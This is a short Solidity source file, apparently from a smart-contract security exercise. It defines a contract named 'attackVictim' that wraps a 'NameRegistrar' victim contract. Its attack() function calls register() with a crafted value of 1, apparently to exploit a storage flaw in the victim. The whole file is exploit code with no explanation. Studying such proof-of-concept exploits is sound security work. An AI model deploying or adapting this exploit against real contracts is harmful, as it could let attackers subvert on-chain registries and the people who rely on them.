pragma solidity ^0.4.0;
import "./victim.sol";
contract attackVictim{
    NameRegistrar public victimContract;
    constructor(address _victimContractAddr) public{
        victimContract = NameRegistrar(_victimContractAddr);
    }

    function attack() public payable{
        victimContract.register(0x0000000000000000000000000000000000000000000000000000000000000001 , msg.sender);
    }
}